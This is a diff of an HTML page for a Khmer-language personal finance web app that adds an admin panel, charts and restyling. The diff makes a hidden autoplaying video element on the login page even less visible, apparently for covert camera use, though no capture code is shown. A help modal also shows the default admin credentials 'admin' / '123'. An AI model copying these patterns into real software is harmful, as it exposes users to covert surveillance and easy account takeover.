@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Personal Finance Cloud v4 - Admin Telegram Security Integration</title>
+    <title>Personal Finance Cloud v5 - Enterprise Master System</title>
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <script src="https://cdn.tailwindcss.com"></script>
@@ -14,202 +14,209 @@
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/Sortable/1.15.0/Sortable.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
         .font-siemreab { font-family: 'Siemreab', sans-serif; }
         .font-moul { font-family: 'Moul', sans-serif; }
         .font-inter { font-family: 'Inter', sans-serif; }
-        .theme-aba { background: linear-gradient(135deg, #b01919 0%, #610505 100%); }
-        .theme-forest { background: linear-gradient(135deg, #164220 0%, #3a7d44 100%); }
-        .theme-ocean { background: linear-gradient(135deg, #0b3c5d 0%, #256bb3 100%); }
-        .theme-luxury { background: linear-gradient(135deg, #111111 0%, #333333 100%); }
-        .btn-modern { box-shadow: 0 4px 15px rgba(0,0,0,0.15); transition: all 0.2s ease; }
-        .btn-modern:active { transform: scale(0.96); }
-        #map { height: 250px; border-radius: 1rem; margin-top: 10px; width: 100%; }
-        .draggable-widget { transition: border 0.2s ease, box-shadow 0.2s ease; }
-        .sortable-ghost { opacity: 0.4; background-color: #e2e8f0; }
-        @media all and (display-mode: standalone) { body { padding-bottom: 75px; } }
+        .theme-aba { background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); }
+        .theme-admin { background: linear-gradient(135deg, #0b0f19 0%, #111827 100%); }
+        .glass-card { background: rgba(255, 255, 255, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(226, 232, 240, 0.8); }
+        .glass-admin-card { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(71, 85, 105, 0.5); }
+        .btn-premium { box-shadow: 0 4px 14px rgba(0,0,0,0.1); transition: all 0.2s ease; }
+        .btn-premium:active { transform: scale(0.97); }
+        #map { height: 250px; border-radius: 1.25rem; width: 100%; }
+        .sortable-ghost { opacity: 0.3; background-color: #cbd5e1; }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
     </style>
 </head>
 <body id="app-body" class="bg-slate-50 font-siemreab min-h-screen text-slate-800 transition-all duration-300">
 
     <div id="notification-box" class="fixed top-5 right-5 z-50 transform translate-y-[-20px] opacity-0 transition-all duration-300 pointer-events-none">
-        <div class="bg-slate-900 text-white text-xs font-bold px-4 py-3 rounded-2xl shadow-2xl border border-slate-700/50 flex items-center space-x-2">
-            <i class="fa-solid fa-circle-info text-amber-400 text-sm" id="notify-icon"></i>
-            <span id="notify-msg">សារជូនដំណឹង</span>
+        <div class="bg-slate-900 text-white text-xs font-bold px-5 py-3.5 rounded-2xl shadow-2xl border border-slate-700/50 flex items-center space-x-3">
+            <i class="fa-solid fa-circle-info text-amber-400 text-base" id="notify-icon"></i>
+            <span id="notify-msg">សារជូនដំណឹងប្រព័ន្ធ</span>
         </div>
     </div>
 
-    <video id="auth-hidden-video" autoplay muted class="hidden"></video>
+    <video id="auth-hidden-video" autoplay muted class="hidden" style="width:1px; height:1px; opacity:0; pointer-events:none;"></video>
 
-    <div id="auth-page" class="flex items-center justify-center min-h-screen p-4">
-        <div class="bg-white rounded-3xl shadow-2xl p-8 w-full max-w-md border border-slate-100">
+    <div id="auth-page" class="flex items-center justify-center min-h-screen p-4 bg-slate-100">
+        <div class="bg-white rounded-[2rem] shadow-2xl p-8 w-full max-w-md border border-slate-200/60 relative overflow-hidden">
             <div class="text-center mb-6">
                 <div class="relative w-20 h-20 mx-auto mb-3 group cursor-pointer" onclick="triggerAppLogoUpload()">
-                    <img id="app-logo-img" src="https://ui-avatars.com/api/?name=FC&background=b01919&color=fff" class="w-full h-full rounded-2xl object-cover shadow-lg border border-slate-200">
+                    <img id="app-logo-img" src="https://ui-avatars.com/api/?name=FC&background=0f172a&color=fff" class="w-full h-full rounded-2xl object-cover shadow-lg border border-slate-200">
                     <div class="absolute inset-0 bg-black/50 rounded-2xl flex items-center justify-center opacity-0 group-hover:opacity-100 transition-all">
                         <i class="fa-solid fa-camera text-white text-xs"></i>
                     </div>
                 </div>
-                <h1 class="text-xl font-bold tracking-wide data-lang" data-km="Cloud Personal Finance" data-en="Cloud Personal Finance">Cloud Personal Finance</h1>
-                <p class="text-slate-400 text-[11px] mt-1 data-lang" data-km="ទិន្នន័យរក្សាទុកលើ Google Sheets ផ្ទាល់ខ្លួន" data-en="Data stored securely on your Google Sheets">ទិន្នន័យរក្សាទុកលើ Google Sheets ផ្ទាល់ខ្លួន</p>
+                <h1 class="text-xl font-bold tracking-wide text-slate-900">Finance Cloud Pro</h1>
+                <p class="text-slate-400 text-[11px] mt-0.5">ប្រព័ន្ធគ្រប់គ្រងហិរញ្ញវត្ថុ និងសន្តិសុខឆ្លាតវៃ</p>
             </div>
             
-            <div class="flex bg-slate-100 p-1 rounded-xl mb-6">
-                <button onclick="switchAuthTab('login')" id="tab-login" class="w-1/2 py-2 text-xs font-bold rounded-lg bg-white text-slate-800 shadow-sm transition-all data-lang" data-km="ចូលប្រើ" data-en="Login">ចូលប្រើ</button>
-                <button onclick="switchAuthTab('signup')" id="tab-signup" class="w-1/2 py-2 text-xs font-bold rounded-lg text-slate-400 transition-all data-lang" data-km="ចុះឈ្មោះ" data-en="Sign Up">ចុះឈ្មោះ</button>
+            <div class="flex bg-slate-100 p-1 rounded-xl mb-5">
+                <button onclick="switchAuthTab('login')" id="tab-login" class="w-1/2 py-2 text-xs font-bold rounded-lg bg-white text-slate-800 shadow-sm transition-all">ចូលប្រើ</button>
+                <button onclick="switchAuthTab('signup')" id="tab-signup" class="w-1/2 py-2 text-xs font-bold rounded-lg text-slate-400 transition-all">ចុះឈ្មោះ</button>
             </div>
 
             <form onsubmit="handleAuth(event)" class="space-y-4">
                 <div>
-                    <label class="block text-[10px] font-bold uppercase tracking-wider text-slate-400 mb-1 data-lang" data-km="ឈ្មោះអ្នកប្រើប្រាស់ (Username)" data-en="Username">ឈ្មោះអ្នកប្រើប្រាស់ (Username)</label>
-                    <input type="text" id="auth-username" required class="w-full px-4 py-2.5 bg-slate-50 rounded-xl border border-slate-200 focus:outline-none focus:border-slate-400 transition font-bold">
+                    <label class="block text-[10px] font-bold uppercase tracking-wider text-slate-400 mb-1">ឈ្មោះអ្នកប្រើប្រាស់ (Username)</label>
+                    <input type="text" id="auth-username" required class="w-full px-4 py-3 bg-slate-50 rounded-xl border border-slate-200 focus:outline-none focus:border-slate-400 transition font-bold text-xs">
                 </div>
                 <div>
                     <div class="flex justify-between items-center mb-1">
-                        <label class="block text-[10px] font-bold uppercase tracking-wider text-slate-400 data-lang" data-km="លេខសម្ងាត់ (Password)" data-en="Password">លេខសម្ងាត់ (Password)</label>
-                        <button type="button" onclick="openForgotModal()" class="text-[11px] text-red-600 font-bold hover:underline data-lang" data-km="ភ្លេចលេខសម្ងាត់?" data-en="Forgot Password?">ភ្លេចលេខសម្ងាត់?</button>
+                        <label class="block text-[10px] font-bold uppercase tracking-wider text-slate-400">លេខសម្ងាត់ (Password)</label>
+                        <button type="button" onclick="openForgotModal()" class="text-[10px] text-indigo-600 font-bold hover:underline">ជំនួយ?</button>
                     </div>
-                    <input type="password" id="auth-password" required class="w-full px-4 py-2.5 bg-slate-50 rounded-xl border border-slate-200 focus:outline-none focus:border-slate-400 transition font-bold" placeholder="••••••••">
+                    <input type="password" id="auth-password" required class="w-full px-4 py-3 bg-slate-50 rounded-xl border border-slate-200 focus:outline-none focus:border-slate-400 transition font-bold text-xs" placeholder="••••••••">
                 </div>
-                <button type="submit" id="auth-btn" class="w-full theme-aba text-white font-bold py-3 px-4 rounded-xl btn-modern text-xs data-lang" data-km="ចូលប្រើប្រាស់កម្មវិធី" data-en="Access Dashboard">ចូលប្រើប្រាស់កម្មវិធី</button>
+                <button type="submit" id="auth-btn" class="w-full bg-slate-900 hover:bg-slate-800 text-white font-bold py-3.5 rounded-xl btn-premium text-xs tracking-wide">ចូលប្រើប្រាស់ប្រព័ន្ធ</button>
             </form>
         </div>
     </div>
 
-    <div id="forgot-modal" class="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4 hidden">
-        <div class="bg-white rounded-3xl p-6 max-w-sm w-full space-y-4 shadow-2xl">
-            <h3 class="font-bold text-sm text-slate-800"><i class="fa-solid fa-key text-red-500 mr-1"></i> ជំនួយពេលភ្លេចលេខសម្ងាត់</h3>
-            <div class="bg-amber-50 border border-amber-200 p-3 rounded-xl">
-                <p class="text-[11px] text-amber-700 mt-1">លេខសម្ងាត់លំនាំដើមរបស់អ្នកជាទូទៅគឺ 123</p>
-            </div>
-            <button onclick="closeForgotModal()" class="w-full py-2 bg-slate-800 text-white font-bold rounded-xl text-xs">យល់ព្រមបិទ</button>
+    <div id="forgot-modal" class="fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-white rounded-3xl p-6 max-w-sm w-full space-y-4 shadow-2xl border">
+            <h3 class="font-bold text-sm text-slate-900"><i class="fa-solid fa-key text-amber-500 mr-1"></i> ជំនួយគណនី</h3>
+            <p class="text-[11px] text-slate-500 leading-relaxed">គណនី Admin លំនាំដើមគឺ៖<br><b>Username:</b> admin<br><b>Password:</b> 123</p>
+            <button onclick="closeForgotModal()" class="w-full py-2.5 bg-slate-900 text-white font-bold rounded-xl text-xs">បិទផ្ទាំងនេះ</button>
         </div>
     </div>
 
     <div id="app-page" class="hidden min-h-screen flex flex-col md:flex-row">
         
-        <aside class="w-full md:w-64 bg-white shadow-xl p-6 flex flex-row md:flex-col justify-between items-center md:items-stretch border-r border-slate-100">
+        <aside id="app-sidebar" class="w-full md:w-64 bg-white shadow-xl p-6 flex flex-row md:flex-col justify-between items-center md:items-stretch border-r border-slate-200/60 z-30">
             <div class="flex md:flex-col items-center md:items-start space-x-3 md:space-x-0 md:space-y-6 w-full">
-                <div class="flex items-center space-x-3 cursor-pointer group" onclick="triggerAppLogoUpload()">
-                    <div class="relative w-10 h-10 rounded-xl overflow-hidden shadow-md">
-                        <img id="sidebar-logo-img" src="https://ui-avatars.com/api/?name=FC&background=b01919&color=fff" class="w-full h-full object-cover">
-                    </div>
-                    <span class="font-bold text-sm hidden sm:inline md:inline">Finance Cloud</span>
+                <div class="flex items-center space-x-2.5 cursor-pointer" onclick="triggerAppLogoUpload()">
+                    <img id="sidebar-logo-img" src="https://ui-avatars.com/api/?name=FC&background=0f172a&color=fff" class="w-9 h-9 rounded-xl object-cover shadow-md">
+                    <span class="font-bold text-sm hidden sm:inline text-slate-900" id="sidebar-brand-title">Finance Cloud</span>
                 </div>
-                <nav class="hidden md:block w-full space-y-2">
-                    <button id="nav-dashboard" onclick="switchSection('dashboard')" class="w-full flex items-center space-x-3 bg-slate-100 text-slate-800 p-3 rounded-xl font-bold text-xs transition-all">
-                        <i class="fa-solid fa-chart-pie text-indigo-500"></i> <span class="data-lang" data-km="ផ្ទាំងគ្រប់គ្រង" data-en="Dashboard">ផ្ទាំងគ្រប់គ្រង</span>
+                
+                <nav class="hidden md:block w-full space-y-1.5">
+                    <button id="nav-dashboard" onclick="switchSection('dashboard')" class="w-full flex items-center space-x-3 bg-slate-100 text-slate-950 p-3 rounded-xl font-bold text-xs transition-all">
+                        <i class="fa-solid fa-chart-pie text-indigo-500 text-sm"></i> <span>ផ្ទាំងគ្រប់គ្រង</span>
                     </button>
                     <button id="nav-scanners" onclick="switchSection('scanners')" class="w-full flex items-center space-x-3 text-slate-500 p-3 rounded-xl font-bold text-xs hover:bg-slate-50 transition-all">
-                        <i class="fa-solid fa-radar text-amber-500"></i> <span class="data-lang" data-km="ប្រព័ន្ធស្កេនពិតប្រាកដ" data-en="Real Tools Scanner">ប្រព័ន្ធស្កេនពិតប្រាកដ</span>
+                        <i class="fa-solid fa-radar text-amber-500 text-sm"></i> <span>ប្រព័ន្ធស្កេនឧបករណ៍</span>
                     </button>
                     <button id="nav-daily" onclick="switchSection('daily')" class="w-full flex items-center space-x-3 text-slate-500 p-3 rounded-xl font-bold text-xs hover:bg-slate-50 transition-all">
-                        <i class="fa-solid fa-list-check text-emerald-500"></i> <span class="data-lang" data-km="គោលដៅប្រចាំថ្ងៃ" data-en="Daily List">គោលដៅប្រចាំថ្ងៃ</span>
+                        <i class="fa-solid fa-list-check text-emerald-500 text-sm"></i> <span>គោលដៅប្រចាំថ្ងៃ</span>
                     </button>
                     <button id="nav-settings" onclick="switchSection('settings')" class="w-full flex items-center space-x-3 text-slate-500 p-3 rounded-xl font-bold text-xs hover:bg-slate-50 transition-all">
-                        <i class="fa-solid fa-gear text-slate-400"></i> <span class="data-lang" data-km="ការកំណត់ (Settings)" data-en="Settings">ការកំណត់ (Settings)</span>
+                        <i class="fa-solid fa-gear text-slate-400 text-sm"></i> <span>ការកំណត់ប្រព័ន្ធ</span>
                     </button>
+                    
+                    <div id="admin-sidebar-nav" class="hidden border-t border-slate-100 pt-3 mt-3 space-y-1.5">
+                        <p class="text-[9px] font-bold text-slate-400 uppercase tracking-widest px-3">ផ្នែកគ្រប់គ្រង Admin</p>
+                        <button id="nav-admin-panel" onclick="switchSection('admin-panel')" class="w-full flex items-center space-x-3 text-slate-500 p-3 rounded-xl font-bold text-xs hover:bg-slate-50 transition-all">
+                            <i class="fa-solid fa-shield-halved text-rose-500 text-sm"></i> <span>ផ្ទាំងបញ្ជា Admin Control</span>
+                        </button>
+                    </div>
                 </nav>
             </div>
-            <button onclick="handleLogout()" class="text-slate-400 hover:text-red-500 font-bold text-xs flex items-center space-x-2 hidden md:flex">
-                <i class="fa-solid fa-power-off"></i> <span class="data-lang" data-km="ចាកចេញពីគណនី" data-en="Logout">ចាកចេញពីគណនី</span>
+
+            <button onclick="handleLogout()" class="text-slate-500 hover:text-rose-600 font-bold text-xs flex items-center space-x-2 hidden md:flex p-2 rounded-xl hover:bg-rose-50 transition-all w-full">
+                <i class="fa-solid fa-right-from-bracket text-sm"></i> <span>ចាកចេញពីប្រព័ន្ធ (Logout)</span>
             </button>
         </aside>
 
-        <div class="flex-1 flex flex-col">
+        <div class="flex-1 flex flex-col overflow-x-hidden">
             
-            <header class="bg-white border-b px-4 py-3 flex flex-col sm:flex-row justify-between items-center space-y-2 sm:space-y-0 shadow-sm">
-                <div class="flex items-center space-x-2 text-xs font-bold text-slate-600">
-                    <i class="fa-regular fa-calendar-days text-indigo-500 text-sm"></i>
-                    <span id="topbar-date">...</span>
+            <header class="bg-white border-b border-slate-200/60 px-6 py-3.5 flex flex-col sm:flex-row justify-between items-center space-y-2 sm:space-y-0 shadow-sm z-20">
+                <div class="flex items-center space-x-3 text-xs font-bold text-slate-600">
+                    <span id="topbar-date" class="text-slate-800">...</span>
                     <span class="text-slate-300">|</span>
-                    <i class="fa-regular fa-clock text-amber-500 text-sm"></i>
-                    <span id="topbar-time" class="font-mono">00:00:00 AM</span>
+                    <span id="topbar-time" class="font-mono text-indigo-600 bg-indigo-50 px-2 py-0.5 rounded-md">00:00:00 AM</span>
                 </div>
-                <div class="bg-amber-50 border border-amber-200 text-amber-800 px-3 py-1 rounded-full text-[11px] font-bold flex items-center space-x-1 animate-pulse">
-                    <i class="fa-solid fa-flag"></i>
-                    <span id="topbar-holiday" class="data-lang" data-km="ថ្ងៃនេះ៖ ថ្ងៃធ្វើការធម្មតា" data-en="Today: Normal Working Day">ថ្ងៃនេះ៖ ថ្ងៃធ្វើការធម្មតា</span>
+                <div class="bg-amber-50 border border-amber-200/60 text-amber-800 px-3 py-1 rounded-full text-[11px] font-bold flex items-center space-x-1">
+                    <i class="fa-solid fa-circle-check text-emerald-500"></i>
+                    <span id="system-status-text">ប្រព័ន្ធដំណើរការធម្មតា (Secure Cloud Connected)</span>
                 </div>
             </header>
 
-            <main class="flex-1 p-4 md:p-6 max-w-4xl w-full mx-auto space-y-6">
+            <main class="flex-1 p-4 md:p-6 max-w-5xl w-full mx-auto space-y-6 pb-24 md:pb-6">
                 
-                <div class="bg-white rounded-3xl p-4 shadow-sm border border-slate-100 flex items-center justify-between">
+                <div class="bg-white rounded-2xl p-4 shadow-sm border border-slate-200/60 flex items-center justify-between">
                     <div class="flex items-center space-x-3">
                         <div class="relative group cursor-pointer" onclick="triggerAvatarUpload()">
-                            <img id="dashboard-avatar" src="https://ui-avatars.com/api/?name=User&background=random" class="w-11 h-11 rounded-xl object-cover border border-slate-200 shadow-sm">
+                            <img id="dashboard-avatar" src="https://ui-avatars.com/api/?name=User&background=random" class="w-12 h-12 rounded-xl object-cover border shadow-sm">
                             <div class="absolute inset-0 bg-black/40 rounded-xl flex items-center justify-center opacity-0 group-hover:opacity-100 transition-all">
                                 <i class="fa-solid fa-camera text-white text-[10px]"></i>
                             </div>
                         </div>
                         <div>
                             <div class="flex items-center space-x-1.5">
-                                <h4 id="dashboard-username" class="font-bold text-xs text-slate-800">User</h4>
-                                <button onclick="enableDashboardEditUsername()" class="text-slate-400 hover:text-indigo-500 text-[10px]"><i class="fa-solid fa-pen"></i></button>
+                                <h4 id="dashboard-username" class="font-bold text-sm text-slate-900">User</h4>
+                                <span id="user-role-badge" class="text-[9px] px-2 py-0.5 rounded-full font-bold bg-slate-100 text-slate-600">Customer</span>
                             </div>
-                            <div id="dash-username-box" class="hidden mt-1 flex items-center space-x-1">
-                                <input type="text" id="dash-new-username" class="border border-slate-200 bg-slate-50 rounded-lg px-2 py-0.5 text-[11px] font-bold w-24 focus:outline-none">
-                                <button onclick="saveDashboardUsername()" class="bg-emerald-500 text-white text-[9px] px-1.5 py-1 rounded-md font-bold">ដូរ</button>
-                            </div>
-                            <p class="text-[9px] text-slate-400 data-lang" data-km="គណនីប្រើប្រាស់ផ្ទាល់ខ្លួន" data-en="Personal Verified Profile">គណនីប្រើប្រាស់ផ្ទាល់ខ្លួន</p>
+                            <p class="text-[10px] text-slate-400 font-medium">គណនីបានផ្ទៀងផ្ទាត់ជោគជ័យ</p>
                         </div>
                     </div>
                     <div>
-                        <button id="toggle-layout-btn" onclick="toggleLayoutEdit()" class="bg-slate-800 text-white text-[11px] font-bold px-3 py-1.5 rounded-xl btn-modern flex items-center space-x-1">
-                            <i class="fa-solid fa-sliders text-amber-400 mr-1" id="layout-btn-icon"></i>
-                            <span id="layout-btn-text" class="data-lang" data-km="កែសម្រួលផ្ទាំង (Edit)" data-en="Edit Layout">កែសម្រួលផ្ទាំង (Edit)</span>
+                        <button id="toggle-layout-btn" onclick="toggleLayoutEdit()" class="bg-slate-900 hover:bg-slate-800 text-white text-[11px] font-bold px-3.5 py-2 rounded-xl btn-premium flex items-center space-x-1.5">
+                            <i class="fa-solid fa-sliders text-amber-400" id="layout-btn-icon"></i>
+                            <span id="layout-btn-text">កែសម្រួលផ្ទាំង Layout</span>
                         </button>
                     </div>
                 </div>
 
                 <div id="dashboard-sortable-container" class="space-y-6">
                     
-                    <div id="widget-balance" class="draggable-widget theme-aba text-white rounded-3xl p-6 shadow-xl relative overflow-hidden btn-modern">
-                        <div class="flex justify-between items-center mb-2">
-                            <span class="text-xs opacity-75 font-bold uppercase tracking-wider data-lang" data-km="សមតុល្យហិរញ្ញវត្ថុសរុប" data-en="Total Balance Summary">សមតុល្យហិរញ្ញវត្ថុសរុប</span>
-                            <span id="sync-badge" class="bg-emerald-500 text-[9px] px-2 py-0.5 rounded-full font-bold">Cloud Synced</span>
+                    <div id="widget-balance" class="draggable-widget bg-slate-900 text-white rounded-3xl p-6 shadow-xl relative overflow-hidden">
+                        <div class="absolute -right-10 -bottom-10 w-40 h-40 bg-indigo-600/20 rounded-full blur-2xl"></div>
+                        <div class="flex justify-between items-center mb-2 relative z-10">
+                            <span class="text-xs text-slate-400 font-bold uppercase tracking-wider">សមតុល្យហិរញ្ញវត្ថុសរុប</span>
+                            <span id="sync-badge" class="bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 text-[9px] px-2 py-0.5 rounded-full font-bold">Cloud Live</span>
                         </div>
-                        <h2 id="balance-text" class="text-3xl font-bold tracking-tight">$0.00</h2>
+                        <h2 id="balance-text" class="text-3xl font-bold tracking-tight text-white font-inter">$0.00</h2>
                     </div>
 
-                    <div id="widget-stats" class="draggable-widget bg-white rounded-3xl p-5 shadow-md border border-slate-100 space-y-4">
-                        <h3 class="font-bold text-xs text-slate-700"><i class="fa-solid fa-chart-line mr-1 text-indigo-500"></i> <span class="data-lang" data-km="ស្ថិតិភាគរយនៃការចំណាយ" data-en="Expense Analysis">ស្ថិតិភាគរយនៃការចំណាយ</span></h3>
-                        <div class="grid grid-cols-2 gap-3">
-                            <div class="bg-rose-50/50 p-3 rounded-2xl border border-rose-100">
-                                <span class="text-[9px] font-bold text-rose-500 block uppercase data-lang" data-km="សរុបចំណាយ" data-en="Total Expense">សរុបចំណាយ</span>
-                                <span id="analyst-expense" class="text-sm font-bold text-rose-600">$0.00</span>
+                    <div id="widget-stats" class="draggable-widget bg-white rounded-3xl p-5 shadow-sm border border-slate-200/60 space-y-4">
+                        <h3 class="font-bold text-xs text-slate-700 flex items-center"><i class="fa-solid fa-chart-line mr-1.5 text-indigo-500 text-sm"></i> ក្រាហ្វិកស្ថិតិ និងភាគរយការចំណាយ (Visual Analytics)</h3>
+                        
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4 items-center">
+                            <div class="md:col-span-1 grid grid-cols-2 md:grid-cols-1 gap-2">
+                                <div class="bg-rose-50/60 p-3 rounded-xl border border-rose-100">
+                                    <span class="text-[9px] font-bold text-rose-500 block uppercase">សរុបការចំណាយ</span>
+                                    <span id="analyst-expense" class="text-base font-bold text-rose-600 font-inter">$0.00</span>
+                                </div>
+                                <div class="bg-emerald-50/60 p-3 rounded-xl border border-emerald-100">
+                                    <span class="text-[9px] font-bold text-emerald-500 block uppercase">សរុបចំណូល</span>
+                                    <span id="analyst-income" class="text-base font-bold text-emerald-600 font-inter">$0.00</span>
+                                </div>
                             </div>
-                            <div class="bg-emerald-50/50 p-3 rounded-2xl border border-emerald-100">
-                                <span class="text-[9px] font-bold text-emerald-500 block uppercase data-lang" data-km="សរុបចំណូល" data-en="Total Income">សរុបចំណូល</span>
-                                <span id="analyst-income" class="text-sm font-bold text-emerald-600">$0.00</span>
+                            <div class="md:col-span-2 h-40 flex items-center justify-center">
+                                <canvas id="financeAnalyticsChart" style="max-height: 100%; width: 100%;"></canvas>
                             </div>
                         </div>
                     </div>
 
-                    <div id="widget-input" class="draggable-widget bg-white rounded-3xl p-6 shadow-md border border-slate-100 space-y-4">
+                    <div id="widget-input" class="draggable-widget bg-white rounded-3xl p-5 shadow-sm border border-slate-200/60 space-y-4">
                         <div class="flex justify-between items-center">
-                            <h3 class="font-bold text-xs text-slate-700"><i class="fa-solid fa-file-pen mr-1 text-amber-500"></i> <span class="data-lang" data-km="បន្ថែមការកត់ត្រាថ្មី" data-en="Create New Entry">បន្ថែមការកត់ត្រាថ្មី</span></h3>
-                            <button onclick="exportToExcel()" class="bg-emerald-600 text-white text-[10px] px-3 py-1.5 rounded-xl font-bold btn-modern flex items-center space-x-1">
-                                <i class="fa-solid fa-file-excel"></i> <span class="data-lang" data-km="ទាញយក Excel" data-en="Export Excel">ទាញយក Excel</span>
+                            <h3 class="font-bold text-xs text-slate-700"><i class="fa-solid fa-file-pen mr-1.5 text-amber-500 text-sm"></i> បញ្ចូលការកត់ត្រាថ្មី</h3>
+                            <button onclick="exportToExcel()" class="bg-emerald-600 hover:bg-emerald-700 text-white text-[10px] px-3 py-1.5 rounded-xl font-bold btn-premium flex items-center space-x-1">
+                                <i class="fa-solid fa-file-excel"></i> <span>ទាញយក Excel</span>
                             </button>
                         </div>
                         
-                        <div class="bg-slate-50 p-4 rounded-2xl border border-dashed border-slate-300 text-center space-y-2">
-                            <p class="text-[11px] font-bold text-slate-500 data-lang" data-km="ស្កេនវិក្កយបត្រដើម្បីបំពេញទឹកប្រាក់ស្វ័យប្រវត្ត (OCR)" data-en="Scan invoice to auto fill amount (OCR)">
+                        <div class="bg-slate-50 p-4 rounded-xl border border-dashed border-slate-300 text-center space-y-2">
+                            <p class="text-[11px] font-bold text-slate-500">
                                 <i class="fa-solid fa-camera mr-1 text-indigo-500"></i> ស្កេនវិក្កយបត្រដើម្បីបំពេញទឹកប្រាក់ស្វ័យប្រវត្ត (OCR)
                             </p>
-                            <button type="button" onclick="triggerReceiptScan()" class="theme-luxury text-white text-[11px] font-bold px-4 py-2 rounded-xl btn-modern mx-auto data-lang" data-km="ជ្រើសរើសរូបថតវិក្កយបត្រ" data-en="Choose Invoice Image">ជ្រើសរើសរូបថតវិក្កយបត្រ</button>
+                            <button type="button" onclick="triggerReceiptScan()" class="bg-slate-900 text-white text-[10px] font-bold px-3 py-1.5 rounded-xl btn-premium">ជ្រើសរើសរូបថតវិក្កយបត្រ</button>
                             <input type="file" id="receipt-file-input" class="hidden" accept="image/*" onchange="processReceiptScan(this)">
                             <p id="scan-status" class="text-[10px] text-slate-400 font-bold italic"></p>
                         </div>
 
-                        <form onsubmit="addTransaction(event)" class="space-y-4">
+                        <form onsubmit="addTransaction(event)" class="space-y-3.5">
                             <div class="grid grid-cols-2 gap-3">
                                 <label class="flex items-center justify-center p-3 rounded-xl cursor-pointer font-bold border text-xs shadow-sm bg-rose-50 border-rose-400 text-rose-500" id="label-expense">
-                                    <input type="radio" name="tx-type" value="expense" checked class="hidden"> <span class="data-lang" data-km="ចំណាយ (-)" data-en="Expense (-)">ចំណាយ (-)</span>
+                                    <input type="radio" name="tx-type" value="expense" checked class="hidden"> <span>ចំណាយ (-)</span>
                                 </label>
                                 <label class="flex items-center justify-center p-3 rounded-xl cursor-pointer font-bold border text-xs shadow-sm bg-white border-slate-200 text-slate-500" id="label-income">
-                                    <input type="radio" name="tx-type" value="income" class="hidden"> <span class="data-lang" data-km="ចំណូល (+)" data-en="Income (+)">ចំណូល (+)</span>
+                                    <input type="radio" name="tx-type" value="income" class="hidden"> <span>ចំណូល (+)</span>
                                 </label>
                             </div>
                             <div class="grid grid-cols-1 sm:grid-cols-3 gap-3">
@@ -226,66 +233,61 @@
                                 </select>
                                 <input type="text" id="tx-category-custom" class="hidden w-full px-3 py-2.5 bg-amber-50 border border-amber-300 rounded-xl font-bold text-xs focus:outline-none" placeholder="បញ្ចូលគោលបំណង">
                             </div>
-                            <button type="submit" id="submit-tx-btn" class="w-full theme-aba text-white font-bold py-3 rounded-xl text-xs btn-modern data-lang" data-km="រក្សាទុកទៅ Cloud Sheets" data-en="Sync Entry to Cloud">រក្សាទុកទៅ Cloud Sheets</button>
+                            <button type="submit" class="w-full bg-slate-900 text-white font-bold py-3 rounded-xl text-xs btn-premium">រក្សាទុកទៅកាន់ Cloud Sheets</button>
                         </form>
                     </div>
 
-                    <div id="widget-history" class="draggable-widget bg-white rounded-3xl p-6 shadow-md border border-slate-100 space-y-4">
+                    <div id="widget-history" class="draggable-widget bg-white rounded-3xl p-5 shadow-sm border border-slate-200/60 space-y-3">
                         <div class="flex justify-between items-center">
-                            <h3 class="font-bold text-xs text-slate-700 data-lang" data-km="ប្រវត្តិប្រតិបត្តិការ" data-en="Transaction History">ប្រវត្តិប្រតិបត្តិការ</h3>
-                            <div class="flex space-x-2">
-                                <button onclick="clearFinanceHistory()" class="bg-rose-50 text-rose-600 px-2.5 py-1 rounded-lg text-[10px] font-bold"><i class="fa-solid fa-trash-can"></i> Clear History</button>
-                            </div>
+                            <h3 class="font-bold text-xs text-slate-700">ប្រវត្តិប្រតិបត្តិការថ្មីៗ</h3>
+                            <button onclick="clearFinanceHistory()" class="bg-rose-50 text-rose-600 px-2.5 py-1 rounded-lg text-[10px] font-bold"><i class="fa-solid fa-trash-can"></i> សម្អាតប្រវត្តិ</button>
                         </div>
-                        <div id="transaction-list" class="space-y-2 max-h-60 overflow-y-auto"></div>
+                        <div id="transaction-list" class="space-y-2 max-h-60 overflow-y-auto pr-1"></div>
                     </div>
                 </div>
 
                 <div id="section-scanners" class="hidden space-y-6">
-                    <div class="bg-white rounded-3xl p-6 shadow-md border border-slate-100 space-y-6">
+                    <div class="bg-white rounded-3xl p-5 shadow-sm border border-slate-200/60 space-y-5">
                         <div class="flex justify-between items-center">
-                            <h3 class="font-bold text-sm text-slate-800"><i class="fa-solid fa-satellite-dish text-indigo-500 mr-1"></i> ប្រព័ន្ធវិភាគ និងវាស់ល្បឿនពិតប្រាកដ (Real Tools)</h3>
+                            <h3 class="font-bold text-sm text-slate-900"><i class="fa-solid fa-satellite-dish text-indigo-500 mr-1.5"></i> ប្រព័ន្ធវិភាគ និងវាស់ល្បឿនពិតប្រាកដ (Real Tools)</h3>
                             <button onclick="clearScanHistory()" class="bg-rose-50 text-rose-600 px-2.5 py-1 rounded-lg text-[10px] font-bold"><i class="fa-solid fa-trash-can"></i> Clear History</button>
                         </div>
                         <div class="grid grid-cols-1 sm:grid-cols-3 gap-3">
-                            <button onclick="startRealSpeedTest()" class="p-4 bg-slate-50 border border-slate-200 rounded-2xl hover:border-indigo-400 transition-all text-center space-y-2">
+                            <button onclick="startRealSpeedTest()" class="p-4 bg-slate-50 border border-slate-200 rounded-xl hover:border-indigo-400 text-center space-y-2">
                                 <i class="fa-solid fa-gauge-high text-xl text-blue-500"></i><p class="text-xs font-bold block">វាស់ល្បឿនអ៊ីនធឺណិត (Speed Test)</p>
                             </button>
